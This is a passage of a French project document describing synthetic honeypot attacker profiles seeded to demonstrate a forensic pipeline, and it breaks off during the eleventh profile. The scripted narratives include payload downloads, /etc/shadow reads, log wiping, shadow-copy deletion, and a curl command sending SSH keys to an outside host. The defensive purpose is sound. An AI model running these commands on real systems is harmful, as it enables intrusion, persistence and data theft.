# Demo Injected IPs — ForenHive Soutenance Dataset

**File:** `forensic-engine/demo_inject_attackers.py`  
**Purpose:** 13 synthetic attacker profiles seeded into PostgreSQL (`forensic_sessions`, `ip_enrichment_cache`) and Elasticsearch (`honeypot-logs-*`) to demonstrate the full forensic pipeline during the PFE presentation.  
**Date injected:** 2026-06-09  

---

## Overview

The 13 IPs are distributed across **6 threat tiers**, each designed to exercise a different segment of the risk-scoring engine, MITRE ATT&CK mapper, and forensic profiler:

| Tier | Count | Risk Band | Kill-Chain Stage |
|---|---|---|---|
| Expert | 3 | Critical (≥ 70) | Actions on Objectives (7) |
| Medium | 4 | High (45–69) | Lateral Movement (5) |
| Amateur | 3 | Low (< 25) | Credential Access (4) |
| Insider Expert | 1 | Critical (≥ 70) | Actions on Objectives (7) |
| Insider Amateur | 1 | Medium (25–44) | Discovery (3) |
| TN-Medium | 1 | High (45–69) | Lateral Movement (5) |

---

## Tier 1 — Expert (IPs critiques, acteurs confirmés)

Ces trois IPs représentent la classe d'attaquants la plus dangereuse : infrastructure malveillante connue, couverture multi-honeypots, familles de malwares confirmées, exploitation active de CVEs critiques.

---

### 1. `185.220.101.5` — Tor Exit Node (Germany, Berlin)

**Label:** Tor exit (DE)  
**Organisation:** Tor Exit (ASN 6695)  
**Pays:** Allemagne 🇩🇪

**Profil de menace:**
- IP appartenant au réseau Tor — l'attaquant masque totalement son identité réelle.
- Signalé **1 842 fois** sur AbuseIPDB, score d'abus maximal de **100/100**.
- Détecté sur **3 honeypots simultanément** : Cowrie (SSH), Dionaea (multi-protocoles), Galah (HTTP).
- **38 moteurs VirusTotal** le classent malveillant — famille détectée : **Mirai botnet**.
- A exploité la vulnérabilité **CVE-2017-0144** (EternalBlue / MS17-010).

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée de la session | 47 minutes |
| Tentatives de connexion | 184 |
| Connexions réussies | 3 |
| Commandes exécutées | 42 |
| Données exfiltrées | 1,24 MB |
| Fichiers téléchargés | 6 |
| Enumération SMB | Oui |
| Pré-scan EPM | 12 requêtes |

**Règles YARA déclenchées:** `mirai_botnet`, `ssh_persistence`  
**Tags de comportement:** `credential_access`, `destructive`, `lateral`, `anti_forensics`, `persistence`  
**Techniques MITRE ATT&CK:** T1110.001, T1078, T1552.001, T1021.002, T1486

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE 1 — RECONNAISSANCE (Cowrie SSH :2222)
  L'attaquant, derrière le nœud Tor 185.220.101.5, lance un scanner SSH automatisé.
  Aucune interaction humaine à ce stade — bot Mirai modifié.

  $ nmap -sV -p 22,2222 --open -T4 <cible>
  → Port 2222/tcp open  ssh  OpenSSH 8.2 (honeypot détecté comme cible valide)

[T+00:02] PHASE 2 — BRUTE-FORCE SSH (184 tentatives sur 47 min)
  Dictionnaire embarqué Mirai : paires login/mot de passe par défaut IoT.
  Exemples de credentials testés (capturés par Cowrie) :
    root:root | admin:admin | admin:1234 | root:vizxv | root:xc3511
    support:support | guest:guest | root:password | ubnt:ubnt

  Cowrie log (extrait) :
    2026-06-09T10:02:11Z [SSHService] login attempt [root/root] failed
    2026-06-09T10:02:13Z [SSHService] login attempt [admin/admin] failed
    ...
    2026-06-09T10:14:07Z [SSHService] login attempt [root/vizxv] succeeded  ← succès #1

[T+14:07] PHASE 3 — ACCÈS INITIAL & RECONNAISSANCE SYSTÈME (T1078 + T1082)
  L'attaquant obtient un shell. Commence par cartographier la machine :

    $ uname -a
    Linux honeypot 5.15.0 #1 SMP x86_64 GNU/Linux

    $ cat /proc/cpuinfo | grep "model name" | head -1
    Intel(R) Xeon(R) CPU E5-2630

    $ free -m
    → Collecte la RAM disponible (critère de sélection pour minage/botnet)

    $ cat /etc/passwd
    → Liste tous les comptes système

    $ cat /etc/shadow
    → Tentative d'extraction des hashes de mots de passe  [YARA: ssh_persistence]

[T+16:30] PHASE 4 — TÉLÉCHARGEMENT DU PAYLOAD MIRAI (T1105)
  6 fichiers téléchargés depuis des serveurs C2 Mirai connus :

    $ wget http://185.220.x.x/bins/mirai.arm -O /tmp/.x
    $ wget http://185.220.x.x/bins/mirai.x86 -O /tmp/.y
    $ wget http://185.220.x.x/bins/mirai.mips -O /tmp/.z
    $ chmod +x /tmp/.x /tmp/.y /tmp/.z

  [YARA déclenché : mirai_botnet — signature du loader multi-architecture]

[T+22:00] PHASE 5 — EXÉCUTION & PERSISTANCE (T1547 + T1486)
  Le bot Mirai est exécuté. Il établit la persistance et contacte le C2 :

    $ /tmp/.x &
    $ echo '* * * * * /tmp/.x' >> /var/spool/cron/root
    $ rm -f /var/log/auth.log /var/log/syslog
    → Anti-forensics : suppression des logs [tag: anti_forensics]

  Le processus scanne le réseau local (port 23, 2323, 7547) pour recruter
  d'autres appareils IoT dans le botnet.

[T+25:00] PHASE 6 — MOUVEMENT LATÉRAL SMB (T1021.002 via Dionaea :445)
  Parallèlement, le bot tente EternalBlue sur le segment réseau :

    Paquet SMBv1 TRANS2 malformé → CVE-2017-0144
    EPMapper prescan : 12 requêtes sur port 135 (MS-RPC endpoint mapping)
    Tentatives d'accès partages : \\target\ADMIN$  \\target\C$  \\target\IPC$

  [YARA déclenché : mirai_botnet sur payload SMB]

[T+35:00] PHASE 7 — EXFILTRATION & GALAH HTTP (T1552.001)
  Le bot exfiltre 1,24 MB de données collectées (hashes, config réseau)
  vers le C2 via HTTP (Galah honeypot capturé) :

    POST /upload HTTP/1.1
    Host: 185.220.101.5:8080
    Content-Type: application/octet-stream
    [payload chiffré XOR — signature Mirai]

[T+47:00] FIN DE SESSION — bot auto-terminé après cycle complet
```

**Interprétation:** Scénario classique d'un nœud de sortie Tor utilisé pour une campagne Mirai ciblant des appareils exposés via SSH. La combinaison anti-forensics + persistence indique un acteur cherchant à maintenir un accès durable après compromission.

---

### 2. `45.227.255.206` — Bulletproof Host (Russie, Moscou)

**Label:** Bulletproof host (RU)  
**Organisation:** QHoster (ASN 209605)  
**Pays:** Russie 🇷🇺

**Profil de menace:**
- Hébergeur "bulletproof" — service qui refuse les demandes de retrait légales, utilisé par des groupes APT.
- Score d'abus **97/100**, **967 signalements** confirmés.
- Utilise un **VPN** pour obfusquer le trafic de commande.
- Famille détectée par VirusTotal : **Cobalt Strike** — framework de post-exploitation utilisé par des groupes APT étatiques.
- A exploité **CVE-2020-1472** (Zerologon — élévation de privilèges domaine Windows).

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée de la session | 38 minutes |
| Tentatives de connexion | 92 |
| Connexions réussies | 2 |
| Commandes exécutées | 38 |
| Données exfiltrées | 880 KB |
| Fichiers téléchargés | 4 |
| Enumération SMB | Oui |
| Pré-scan EPM | 8 requêtes |

**Règles YARA déclenchées:** `cobalt_strike_beacon`, `credential_harvester`  
**Tags de comportement:** `credential_access`, `lateral`, `anti_forensics`  
**Techniques MITRE ATT&CK:** T1110.001, T1078, T1552.001, T1021.002, T1486

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE 1 — ACCÈS INITIAL SSH avec liste de credentials ciblée
  Contrairement à Mirai, cette liste est curated — pas un dictionnaire générique.
  Indique une reconnaissance préalable (OSINT sur la cible).

  Credentials testés sur Cowrie (92 tentatives) :
    Administrator:P@ssw0rd | sysadmin:Admin123! | backup:backup2024
    deploy:deploy123 | oracle:oracle | postgres:postgres123

  2026-06-09T11:05:44Z login attempt [Administrator/Admin2023] succeeded  ← succès #1

[T+05:44] PHASE 2 — RECONNAISSANCE POST-ACCÈS (T1082 + T1016)
  L'opérateur Cobalt Strike explore l'environnement manuellement :

    $ whoami && id
    root uid=0(root)

    $ hostname && cat /etc/hosts
    → Identifie le nom de la machine et les hôtes connus

    $ ip addr && ip route && arp -a
    → Cartographie réseau complète — segmentation, passerelles, voisins ARP

    $ ps aux | grep -E "sql|db|oracle|tomcat|nginx|apache"
    → Recherche de services à valeur (bases de données, middleware)

    $ find / -name "*.conf" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -20
    → Chasse aux fichiers de configuration contenant des credentials

[T+10:00] PHASE 3 — DÉPLOIEMENT BEACON COBALT STRIKE (T1105)
  4 fichiers téléchargés — stager + beacon + reflective DLL loader :

    $ curl -s http://45.227.x.x/stage.bin -o /tmp/.svc
    $ curl -s http://45.227.x.x/beacon.elf -o /tmp/.beacon
    $ chmod +x /tmp/.svc /tmp/.beacon

  Le beacon s'injecte dans un processus légitime (ex: /usr/bin/python3) :
    $ /tmp/.svc --inject $(pgrep python3 | head -1)

  [YARA déclenché : cobalt_strike_beacon — magic bytes + config block XOR]

[T+14:00] PHASE 4 — EXTRACTION DE CREDENTIALS (T1552.001)
  L'opérateur utilise des modules Cobalt Strike pour extraire les hashes :

    [beacon] hashdump
    → Lecture /etc/shadow via injection kernel

    [beacon] shell cat /root/.ssh/id_rsa
    → Clé privée SSH — permettrait un accès silencieux futur

    [beacon] shell cat /home/*/.bash_history
    → Historique de commandes — identifie d'autres serveurs contactés

  [YARA déclenché : credential_harvester — pattern d'accès /etc/shadow]

[T+20:00] PHASE 5 — MOUVEMENT LATÉRAL SMB + ZEROLOGON (T1021.002 + CVE-2020-1472)
  L'attaquant pivote vers le segment réseau Windows :

  EPMapper prescan (8 requêtes port 135) :
    → Enumère services RPC disponibles : lsarpc, samr, netlogon

  Tentative Zerologon (CVE-2020-1472) sur Netlogon :
    Exploit envoie 256 fois une Netlogon authentication request avec
    ClientChallenge = 0x00000000 (entropie nulle)
    → Cible : réinitialiser le mot de passe du compte machine du DC

  SMB Share enumeration :
    \\target\ADMIN$  →  accès refusé (honeypot)
    \\target\C$      →  accès refusé
    \\target\SYSVOL  →  accès refusé
    \\target\NETLOGON → accès refusé

[T+30:00] PHASE 6 — ANTI-FORENSICS & EXFILTRATION (T1070)
  Exfiltration de 880 KB (hashes + clés SSH + fichiers .env) :

    [beacon] upload /tmp/harvest.tar.gz → C2 45.227.255.206:443 (HTTPS)

  Nettoyage des traces :
    $ history -c && unset HISTFILE
    $ rm -rf /tmp/.svc /tmp/.beacon /tmp/harvest.tar.gz
    $ sed -i '/45.227/d' /var/log/auth.log

[T+38:00] FIN — beacon se met en veille (sleep 3600), session SSH fermée
```

**Interprétation:** Profil typique d'un opérateur Cobalt Strike ciblant l'infrastructure Active Directory via Zerologon. L'hébergement bulletproof rend le takedown quasi impossible — l'analyse forensique est la seule réponse opérationnelle.

---

### 3. `194.165.16.11` — WannaCry Historical C2 (Russie, Saint-Pétersbourg)

**Label:** WannaCry historical C2  
**Organisation:** Datacamp (ASN 60068)  
**Pays:** Russie 🇷🇺

**Profil de menace:**
- Adresse historiquement associée à l'infrastructure de commande et contrôle de **WannaCry** (ransomware mondial de 2017).
- Score d'abus maximal **100/100**, **2 104 signalements** — le plus reporté des 13 IPs.
- **56 moteurs VirusTotal** confirment la famille **WannaCry**.
- Utilise un proxy pour ajouter une couche d'anonymisation.
- A exploité **CVE-2017-0144** (EternalBlue) — même vecteur que l'attaque WannaCry originale.

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée de la session | 62 minutes |
| Tentatives de connexion | 220 |
| Connexions réussies | 5 |
| Commandes exécutées | 51 |
| Données exfiltrées | 2,4 MB |
| Fichiers téléchargés | 8 |
| Enumération SMB | Oui |
| Pré-scan EPM | 18 requêtes |

**Règles YARA déclenchées:** `wannacry_ransomware`, `smb_exploit`  
**Tags de comportement:** `destructive`, `credential_access`, `lateral`, `persistence`, `anti_forensics`  
**Techniques MITRE ATT&CK:** T1110.001, T1078, T1552.001, T1021.002, T1486

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE 1 — SCAN MASSIF EternalBlue (Dionaea :445)
  WannaCry commence toujours par une phase de scan SMB sur /8 ou /16.
  194.165.16.11 est le nœud C2 — il reçoit les rapports des bots infectés
  et orchestre de nouveaux scans.

  Trafic capturé par Dionaea (Zeek NTLM logs) :
    SRC 194.165.16.11:49152 → DST :445
    Paquet SMBv1 NEGOTIATE PROTOCOL REQUEST
    Trans2 SESSION_SETUP avec NTLM negotiate

  EPMapper (18 requêtes port 135) — énumération complète des endpoints RPC :
    UUID: 12345678-1234-ABCD-EF00-01234567CFFB v1.0  (Netlogon)
    UUID: 6BFFD098-A112-3610-9833-46C3F87E345A v1.0  (Workstation)
    UUID: 367ABB81-9844-35F1-AD32-98F038001003 v2.0  (SCManager)

[T+03:00] PHASE 2 — EXPLOITATION CVE-2017-0144 EternalBlue
  Payload EternalBlue envoyé sur port 445 :

    1. SMBv1 NEGOTIATE → serveur répond avec ses capabilities
    2. SESSION_SETUP → null session (sans authentification)
    3. TRANS2 REQUEST avec buffer overflow → écrasement de pointeur kernel
    4. Shellcode injecté dans lsass.exe (SYSTEM privileges)

  Exploit réussi → shell SYSTEM obtenu sans aucune authentification SSH.
  [YARA déclenché : smb_exploit — bytecode EternalBlue signature]

[T+06:00] PHASE 3 — INSTALLATION DOUBLEPULSAR BACKDOOR
  WannaCry installe DoublePulsar (backdoor kernel NSA) comme premier implant :

    Implant kernel : injection ring-0 dans SMB driver (srv.sys)
    Ping test : paquet SMB avec commande 0x0C → répond 0x51 (alive)
    → Backdoor active, persistante même après reboot

[T+10:00] PHASE 4 — TÉLÉCHARGEMENT WANNACRY (T1105)
  8 fichiers téléchargés via DoublePulsar :

    tasksche.exe   — orchestrateur principal WannaCry
    mssecsvc.exe   — service de propagation réseau
    @WanaDecryptor@.exe  — interface rançon (affiché à la victime)
    @Please_Read_Me@.txt — note de rançon
    b.rypt         — clé publique RSA-2048 attaquant
    c.wnry         — configuration Tor pour paiement
    t.wnry         — liste serveurs .onion payment
    u.wnry         — wallet Bitcoin embedded

  [YARA déclenché : wannacry_ransomware — magic "WANACRY!" header + RSA key block]

[T+15:00] PHASE 5 — BRUTE-FORCE SSH PARALLÈLE (Cowrie :2222)
  Pendant que SMB travaille, l'agent lance aussi du brute-force SSH (220 tentatives) :
  Credential list WannaCry embarquée :
    Administrator:123456 | root:toor | admin:password1
    user:user | test:test | operator:operator

  5 succès obtenus sur Cowrie :
    2026-06-09T12:15:00Z login [root/123456] succeeded
    2026-06-09T12:22:00Z login [admin/password1] succeeded
    ...

[T+20:00] PHASE 6 — CHIFFREMENT RANSOMWARE (T1486)
  WannaCry chiffre les fichiers avec AES-128 (clé par fichier) + RSA-2048 :

    Extensions ciblées : .doc .docx .xls .xlsx .ppt .pdf .jpg .zip .tar .gz
    Renommage : fichier.docx → fichier.docx.WNCRY
    Suppression des Shadow Copies (anti-recovery) :
      cmd /c vssadmin delete shadows /all /quiet
      cmd /c wmic shadowcopy delete

  2,4 MB de données collectées exfiltrées (configs, credentials trouvés) :
    POST http://194.165.16.11:80/report [payload chiffré]

[T+45:00] PHASE 7 — PROPAGATION RÉSEAU (T1021.002)
  WannaCry propage vers d'autres machines du segment via EternalBlue :
    Scan /24 local → SMB port 445 → exploit → install DoublePulsar → repeat

[T+62:00] FIN — note de rançon affichée, contact Tor pour paiement Bitcoin
  Note affichée : "Your files have been encrypted. Send 300$ in Bitcoin to..."
  Wallet : 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw
```

**Interprétation:** Session la plus longue et la plus agressive des 13. Représente un acteur réutilisant l'infrastructure WannaCry pour de nouvelles campagnes — démontre que les indicateurs de compromission (IOC) restent pertinents des années après leur découverte initiale.

---

## Tier 2 — Medium (Scanners, botnets, VPN)

Ces quatre IPs représentent des acteurs moins sophistiqués mais très actifs : scanners automatisés, botnet de brute-force, et utilisateurs de VPN commerciaux.

---

### 4. `80.82.77.33` — Censys Scanner (Pays-Bas, Amsterdam)

**Label:** Censys scanner  
**Organisation:** IP Volume (ASN 202425)  
**Pays:** Pays-Bas 🇳🇱

**Profil de menace:**
- Infrastructure de datacenter utilisée pour le scan massif de l'internet (type Censys/Shodan).
- Score d'abus **78/100**, 412 signalements.
- Cible les ports de base de données (**MSSQL port 1433**).
- Aucune connexion réussie — phase de reconnaissance pure.

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée | 12 min |
| Tentatives | 32 |
| Succès | 0 |
| Commandes | 4 |
| Exfiltration | 0 |

**Tags:** `reconnaissance`  
**MITRE:** T1110.003, T1595.002, T1046 — phase `lateral_movement`

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE 1 — SCAN DE DÉCOUVERTE (Dionaea :1433 + Galah :8080)
  Outil utilisé : Masscan ou ZMap (scan internet-scale à 10M paquets/sec).
  Objectif : cartographier toutes les IPs exposant MSSQL ou HTTP.

  Paquet SYN envoyé sur port 1433 (MSSQL) → Dionaea répond SYN-ACK
  → IP marquée "cible valide" dans la base Censys

[T+01:00] PHASE 2 — FINGERPRINTING MSSQL (Dionaea :1433)
  Le scanner envoie le handshake TDS (Tabular Data Stream) de MSSQL :

    TDS Prelogin packet → collecte version SQL Server + encryption support
    TDS Login7 packet   → tente login avec credentials par défaut :
      sa:sa | sa: (vide) | sa:password | sa:admin | sa:sa123

  4 commandes TDS envoyées (comptées comme "commandes" dans le pipeline) :
    SELECT @@version
    SELECT name FROM sys.databases
    EXEC xp_cmdshell 'whoami'   ← indique l'intention d'exécution de commandes
    SELECT * FROM INFORMATION_SCHEMA.TABLES

  Toutes retournent erreur d'auth (honeypot ne valide pas) → 0 succès.

[T+05:00] PHASE 3 — SCAN HTTP (Galah :8080)
  Requêtes HTTP automatisées pour fingerprinting web :

    GET / HTTP/1.1
    GET /admin HTTP/1.1
    GET /.env HTTP/1.1          ← recherche variables d'environnement
    GET /phpinfo.php HTTP/1.1
    GET /wp-login.php HTTP/1.1

  Galah (LLM honeypot) répond de manière crédible → scanner note "serveur actif".

[T+12:00] FIN — données collectées envoyées à l'index Censys/Shodan.
  Résultat pour l'opérateur : "port 1433 + 8080 ouverts, SQL Server détecté,
  auth échouée — cible à retenter avec meilleure wordlist."
```

---

### 5. `92.118.39.18` — NordVPN Exit Node (Panama)

**Label:** NordVPN exit  
**Organisation:** NordVPN (ASN 60068)  
**Pays:** Panama 🇵🇦

**Profil de menace:**
- Nœud de sortie NordVPN — attaquant utilise un VPN commercial grand public pour masquer sa localisation réelle.
- Score d'abus **64/100**, 230 signalements.
- **1 connexion SSH réussie** + 14 KB de données extraites.
- Cible le port 22 (SSH).

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée | 18 min |
| Tentatives | 58 |
| Succès | 1 |
| Commandes | 12 |
| Exfiltration | 14,2 KB |

**Tags:** `reconnaissance`, `credential_access`  
**MITRE:** T1110.003, T1078, T1021.002

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE 1 — BRUTE-FORCE SSH SEMI-MANUEL (Cowrie :2222)
  L'attaquant utilise Hydra ou Medusa depuis sa machine réelle,
  le trafic sort via NordVPN Panama pour masquer sa localisation.

  $ hydra -L users.txt -P rockyou_top1000.txt ssh://target:2222 -t 4 -w 3

  58 tentatives — vitesse modérée (4 threads, délai 3s) pour éviter fail2ban :
    root:123456 | admin:admin | ubuntu:ubuntu | pi:raspberry
    user:user123 | test:test123 | deploy:deploy | ...

  2026-06-09T13:30:22Z login [ubuntu/ubuntu123] succeeded  ← succès

[T+07:22] PHASE 2 — EXPLORATION RAPIDE POST-ACCÈS (T1082)
  12 commandes exécutées manuellement (rythme humain, pas bot) :

    $ id && whoami
    uid=1000(ubuntu) gid=1000(ubuntu) — compte non-root

    $ sudo -l
    → Vérifie les droits sudo disponibles

    $ cat /etc/passwd | grep -v nologin
    → Liste des comptes avec shell

    $ ls -la /home/
    $ ls -la /var/www/ /opt/ /srv/
    → Recherche de répertoires intéressants

    $ cat /proc/version && uname -a
    → Version kernel (recherche exploit local privilege escalation)

    $ cat /etc/crontab && ls /etc/cron.*
    → Vérifie les tâches planifiées (vecteur persistence)

    $ history
    → Historique des commandes — révèle les habitudes de l'administrateur

    $ env | grep -i "pass\|key\|token\|secret\|api"
    → Variables d'environnement avec credentials

    $ find /home /root /etc -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null
    → Clés SSH privées

    $ cat /var/log/auth.log | tail -50
    → Qui d'autre s'est connecté récemment ?

[T+15:00] PHASE 3 — EXFILTRATION (14,2 KB)
  L'attaquant copie les données collectées :

    $ tar czf /tmp/.data.tgz /etc/passwd /home/ubuntu/.bash_history \
      /home/ubuntu/.ssh/ /etc/hosts
    $ curl -s -X POST http://92.118.39.18:4444/upload -F "f=@/tmp/.data.tgz"
    $ rm /tmp/.data.tgz

[T+18:00] FIN — session fermée. Attaquant passe à la prochaine cible.
```

---

### 6. `141.98.10.62` — Mass-Scan Datacenter (Lituanie, Vilnius)

**Label:** Mass-scan datacenter  
**Organisation:** UAB Host (ASN 209605)  
**Pays:** Lituanie 🇱🇹

**Profil de menace:**
- Datacenter lituanien utilisé pour du scan de masse automatisé.
- Score d'abus **70/100**, 318 signalements.
- Cible **MySQL port 3306** — recherche de bases de données exposées.
- 4 pré-scans EPM (endpoint mapping).

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée | 9 min |
| Tentatives | 26 |
| Succès | 0 |
| Exfiltration | 0 |

**Tags:** `reconnaissance`  
**MITRE:** T1110.003, T1046, T1595.002

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE 1 — SCAN MULTI-PORTS (Dionaea + Galah)
  Outil : ZMap ou script Python personnalisé.
  Ports ciblés simultanément : 3306 (MySQL), 5432 (PostgreSQL), 27017 (MongoDB),
  6379 (Redis), 9200 (Elasticsearch), 8080 (HTTP).

[T+00:30] PHASE 2 — FINGERPRINTING MySQL (Dionaea :3306)
  Envoi du handshake MySQL :
    → Client hello → collecte version MySQL Server + auth plugin
    → Tentatives auth :
        root: (mot de passe vide)
        root:root
        root:password
        root:mysql
        admin:admin

  26 tentatives total → 0 succès (Dionaea simule auth failure).

[T+02:00] PHASE 3 — EPMapper SCAN (port 135)
  4 requêtes MS-RPC endpoint mapping pour détecter services Windows :
    → Probe UUID Netlogon, SAMR, lsarpc
    → Résultat : aucun service Windows détecté (honeypot Linux)

[T+04:00] PHASE 4 — GALAH HTTP SCAN
  Requêtes automatiques sur Galah :8080 :
    GET /.env           → cherche MYSQL_ROOT_PASSWORD, DB_PASSWORD
    GET /phpmyadmin/    → interface administration MySQL
    GET /adminer.php    → outil DB léger
    GET /backup.sql     → dump SQL exposé par erreur

[T+09:00] FIN — cible marquée "auth failed, no web DB admin found".
  Résultat transmis à un opérateur qui relancera avec une meilleure wordlist.
```

---

### 7. `5.188.10.156` — Brute-Force Botnet (Russie, Moscou)

**Label:** Brute-force botnet (RU)  
**Organisation:** Webzilla (ASN 35415)  
**Pays:** Russie 🇷🇺

**Profil de menace:**
- Node de botnet dédié aux attaques brute-force SSH.
- Score d'abus **82/100**, 524 signalements.
- Famille détectée : **Generic.Botnet** — dropper générique confirmé par YARA.
- **1 connexion SSH réussie** + 8,4 KB exfiltrés.

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée | 22 min |
| Tentatives | 71 |
| Succès | 1 |
| Commandes | 9 |
| Exfiltration | 8,4 KB |

**Règles YARA:** `generic_dropper`  
**Tags:** `credential_access`  
**MITRE:** T1110.003, T1078, T1105

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE 1 — BRUTE-FORCE SSH BOTNET (Cowrie :2222 + Dionaea :22)
  Ce node fait partie d'un réseau distribué. Il reçoit ses instructions
  depuis un C2 central et attaque avec une liste de credentials rotatifs.

  71 tentatives, vitesse variable pour contourner le rate-limiting :
    root:123456 | root:1234 | root:12345 | root:admin
    admin:123456 | admin:password | test:test | guest:guest
    operator:1234 | ubnt:ubnt | support:support

  2026-06-09T14:45:12Z login [support/support] succeeded  ← succès #1

[T+05:12] PHASE 2 — EXÉCUTION DU DROPPER (T1059.004)
  9 commandes exécutées — script automatique minimal :

    $ uname -m
    x86_64  → confirme architecture pour payload correct

    $ wget -q http://5.188.x.x/drop/x86 -O /tmp/..
    [YARA déclenché : generic_dropper — URLs hardcodées + chmod pattern]

    $ chmod 777 /tmp/..
    $ /tmp/.. &

  Le dropper s'enregistre auprès du C2 avec l'IP compromise
  puis attend des instructions (DDoS, spam, minage, nouveau brute-force).

[T+08:00] PHASE 3 — RAPPORT AU C2 + EXFILTRATION (8,4 KB)
  Le dropper envoie un rapport de compromission :
    POST http://5.188.10.156:8080/report
    Body: { ip: "honeypot_ip", arch: "x86_64", user: "support", 
            os: "Linux 5.15", ram: "2GB" }

[T+22:00] FIN — node reçoit "OK" du C2, passe à la prochaine cible.
```

---

## Tier 3 — Amateur (Résidentiel, accès unique, sans succès)

Ces trois IPs représentent des attaquants peu expérimentés — connexions résidentielles ou VPS basiques, un seul honeypot ciblé, aucune exfiltration.

---

### 8. `41.230.42.17` — Résidentiel Tunisien (Tunis)

**Label:** Residential TN  
**Organisation:** Tunisie Telecom (ASN 2609)  
**Pays:** Tunisie 🇹🇳

- Score d'abus **14/100**, 12 signalements seulement.
- 5 tentatives SSH, 0 succès, 0 commandes.
- Profil typique : script kiddie ou curieux utilisant sa connexion personnelle.

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE UNIQUE — TENTATIVES SSH MANUELLES (Cowrie :2222)
  L'attaquant essaie de se connecter depuis son domicile à Tunis.
  Pas de scanner — connexion SSH directe, à la main.

  $ ssh root@target -p 2222
  Password: admin          → failed
  Password: 123456         → failed
  Password: root           → failed
  Password: toor           → failed
  Password: password       → failed

  5 tentatives en 1 minute → abandon.
  Aucune connaissance des outils de brute-force automatisés.
  Aucun VPN, adresse résidentielle Tunisie Telecom directement exposée.

[T+01:00] FIN — attaquant abandonne, passe à autre chose.
  Profil : curiosité / tentative naïve. Aucune intention malveillante structurée.
```

---

### 9. `197.0.5.12` — Résidentiel Tunisien (Sfax)

**Label:** Residential TN (Ooredoo)  
**Organisation:** Ooredoo TN (ASN 37705)  
**Pays:** Tunisie 🇹🇳

- Score d'abus **8/100** — le plus bas des 13 IPs.
- 3 tentatives SSH, 0 succès.
- Connexion résidentielle Sfax, Ooredoo — activité quasi nulle.

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE UNIQUE — TENTATIVES SSH (Cowrie :2222)
  Activité minimale — probablement un outil automatique basique
  trouvé en ligne (ex: script Python simple) mais sans wordlist sérieuse.

  $ ssh root@target -p 2222
  Password: root        → failed
  Password: admin       → failed
  Password: 1234        → failed

  3 tentatives en moins de 1 minute → connexion coupée par l'outil.
  Adresse résidentielle Sfax non masquée — Ooredoo TN.

[T+01:00] FIN — aucune suite. Score de risque : LOW (8/100).
```

---

### 10. `188.166.13.4` — DigitalOcean Droplet (Royaume-Uni, Londres)

**Label:** DigitalOcean droplet  
**Organisation:** DigitalOcean (ASN 14061)  
**Pays:** Royaume-Uni 🇬🇧

- Score d'abus **22/100**, 38 signalements.
- Cible le **port 8080** (Galah — honeypot HTTP).
- 2 commandes exécutées, reconnaissance HTTP basique.
- VPS bas de gamme loué pour des tests d'intrusion amateurs.

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] PHASE UNIQUE — SCAN WEB BASIQUE (Galah :8080)
  L'attaquant utilise un script de scan web minimal (Nikto ou équivalent).
  VPS DigitalOcean loué — tente de garder son IP résidentielle propre.

  4 tentatives de connexion / requêtes HTTP :

    GET / HTTP/1.1
    → Galah répond avec une page HTML crédible (générée par Mistral)

    GET /admin HTTP/1.1
    → Galah répond 200 OK avec une fausse interface admin

    GET /.env HTTP/1.1
    → Recherche de fichier .env exposé (Laravel, Django, Node.js)
    → Galah génère un faux .env : DB_PASSWORD=xxxx, API_KEY=yyyy

    GET /wp-login.php HTTP/1.1
    → Teste si WordPress présent

  2 "commandes" = les 2 requêtes GET qui ont reçu une réponse exploitable.

  L'attaquant note les résultats manuellement — pas de parsing automatique.
  Pas de tentative d'exploitation réelle suite à la découverte du faux .env.

[T+02:00] FIN — abandon. Profil : amateur en apprentissage de pentest web.
```

---

## Tier 4 — Insider Expert (Menace interne critique)

---

### 11. `10.212.50.5` — Employé Privilégié (Réseau Interne)

**Label:** Privileged employee  
**Réseau:** Interne — `10.212.0.0/16`  
**Statut:** RFC1918 — IP privée, aucune géolocalisation possible

**Profil de menace:**
- Acteur **interne** avec accès réseau privilégié — le scénario le plus dangereux du dataset.
- Aucune réputation externe (AbuseIPDB score 0) — les outils de réputation sont aveugles à cette menace.
- **6 connexions réussies sur 8 tentatives** — l'attaquant connaît les credentials.
- **3,8 MB de données exfiltrées** — la plus grande exfiltration du dataset.
- Règle YARA `credential_harvester` déclenchée → extraction probable de `/etc/shadow`.
- Enumération SMB + pré-scan EPM → cartographie latérale du réseau interne.

**Activité observée:**
| Indicateur | Valeur |
|---|---|
| Durée | 53 minutes |
| Tentatives | 8 |
| Succès | **6** |
| Commandes | 47 |
| Exfiltration | **3,8 MB** |
| Fichiers téléchargés | 5 |

**Règles YARA:** `credential_harvester`  
**Tags:** `credential_access`, `destructive`, `exfiltration`, `anti_forensics`, `lateral`  
**MITRE:** T1110.001, T1078, T1552.001, T1021.002, T1486 — phase `actions_on_objectives`

#### Déroulement de l'attaque — Script pas à pas

```
[T+00:00] CONTEXTE — Employé du service IT, accès légitime au réseau interne.
  Il connaît l'architecture réseau, a des accès root sur plusieurs serveurs.
  Motivations supposées : départ imminent, revente d'informations, sabotage.

[T+00:00] PHASE 1 — CONNEXION SSH INTERNE (Cowrie :2222)
  Depuis sa machine de travail 10.212.50.5 — aucun VPN nécessaire.
  Il connaît les credentials des serveurs de l'entreprise.

  2 premières tentatives échouées (mauvais serveur / mot de passe changé) :
    ssh admin@honeypot → failed
    ssh root@honeypot  → failed (test de l'ancien mot de passe)

  6 connexions réussies avec credentials valides connus :
    ssh sysadmin@honeypot → succeeded  ← accès compte de service
